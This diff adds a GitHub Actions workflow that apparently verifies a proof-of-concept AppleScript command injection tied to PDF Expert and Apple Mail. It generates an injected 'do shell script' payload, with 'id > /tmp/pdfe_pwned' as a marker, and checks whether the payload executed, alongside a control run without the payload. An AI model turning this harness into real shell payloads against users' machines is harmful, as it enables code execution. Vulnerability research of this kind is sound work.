@@ -1,0 +1,78 @@
+name: pdfexpert-gate7b
+
+on:
+  workflow_dispatch:
+
+jobs:
+  g7b:
+    runs-on: macos-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Fetch PDF Expert 1187 and regenerate
+        run: |
+          set -euo pipefail
+          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
+          shasum -a 256 pex.zip
+          unzip -q pex.zip -d app
+          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
+          grep -n 'new outgoing message' generated.scpt
+
+      - name: F1 - one-line tell form with the payload record, marker polled every 1s
+        run: |
+          set +e
+          rm -f /tmp/pdfe_pwned
+          python3 - <<'PY'
+          gen = open('generated.scpt').read()
+          line = [l for l in gen.splitlines() if 'new outgoing message' in l][0]
+          stmt = line.split('make new outgoing message', 1)[1]
+          stmt = 'make new outgoing message' + stmt
+          body = 'with timeout of 12 seconds\n  tell application "Mail" to ' + stmt + '\nend timeout\n'
+          open('f1.scpt','w').write(body)
+          print('--- F1 SCRIPT ---')
+          print(body)
+          PY
+          osacompile -o /tmp/f1.scptd f1.scpt && echo "F1 COMPILE OK" || echo "F1 COMPILE FAILED"
+          START=$(date +%s)
+          osascript f1.scpt > f1.out 2>&1 &
+          PID=$!
+          for i in $(seq 1 30); do
+            if [ -s /tmp/pdfe_pwned ]; then echo "F1 MARKER_AT_SECOND=$(( $(date +%s) - START ))"; break; fi
+            kill -0 $PID 2>/dev/null || { echo "F1 OSA_DIED_AT_SECOND=$(( $(date +%s) - START ))"; break; }
+            sleep 1
+          done
+          ALIVE=no
+          kill -0 $PID 2>/dev/null && ALIVE=yes
+          echo "F1 ELAPSED: $(( $(date +%s) - START ))s osascript_alive=$ALIVE"
+          kill $PID 2>/dev/null; wait $PID 2>/dev/null
+          echo "F1 OUT: [$(cat f1.out)]"
+          if [ -s /tmp/pdfe_pwned ]; then echo "F1 PROOF: do shell script executed"; echo "F1 MARKER: [$(cat /tmp/pdfe_pwned)]"; else echo "F1 PROOF: none"; fi
+
+      - name: F2 - same event, plain content, no payload (isolates the event from the injection)
+        run: |
+          set +e
+          rm -f /tmp/pdfe_plain
+          cat > f2.scpt <<'S'
+          with timeout of 12 seconds
+            tell application "Mail" to make new outgoing message with properties {subject:"Invoice", content:"plain body" & linefeed & linefeed}
+          end timeout
+          return "F2 RETURNED"
+          S
+          osacompile -o /tmp/f2.scptd f2.scpt && echo "F2 COMPILE OK" || echo "F2 COMPILE FAILED"
+          START=$(date +%s)
+          OUT=$(osascript f2.scpt 2>&1)
+          RC=$?
+          echo "F2 RC=$RC ELAPSED=$(( $(date +%s) - START ))s OUT=[$OUT]"
+
+      - name: F3 - Mail state after the timeout
+        run: |
+          set +e
+          pgrep -x Mail && echo "Mail running" || echo "Mail not running"
+          OUT=$(osascript -e 'with timeout of 10 seconds' -e 'tell application "Mail" to get name' -e 'end timeout' 2>&1)
+          echo "F3 get name RC=$? OUT=[$OUT]"
+          OUT2=$(osascript -e 'with timeout of 10 seconds' -e 'tell application "Mail" to count of accounts' -e 'end timeout' 2>&1)
+          echo "F3 count of accounts RC=$? OUT=[$OUT2]"
+          killall Mail 2>/dev/null
+          sleep 2
+          echo done
